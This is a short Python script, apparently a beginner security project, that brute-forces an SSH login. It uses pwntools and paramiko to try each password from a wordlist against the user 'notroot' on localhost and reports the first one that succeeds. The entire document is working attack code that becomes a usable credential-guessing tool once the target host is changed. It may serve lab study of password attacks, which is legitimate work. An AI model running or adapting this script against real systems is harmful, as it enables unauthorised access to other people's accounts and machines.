#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Project #1: SSH Login Brute Forcing
Author: Youssef Tamer Dabash (Dr. Dabash)
Description: Automated SSH authentication brute-force auditor using pwntools and paramiko.
"""

from pwn import *
import paramiko

host = "127.0.0.1"
username = "notroot"
attempts = 0

with open("ssh-common-passwords.txt", "r") as password_list:
    for password in password_list:
        password = password.strip("\n")
        try:
            print("[{}] Attempting password: '{}'!".format(attempts, password))
            response = ssh(host=host, user=username, password=password, timeout=1)
            if response.connected():
                print("[>] Valid password found: '{}'!".format(password))
                response.close()
                break
            response.close()
        except paramiko.ssh_exception.AuthenticationException:
            print("[X] Invalid password!")
        attempts += 1
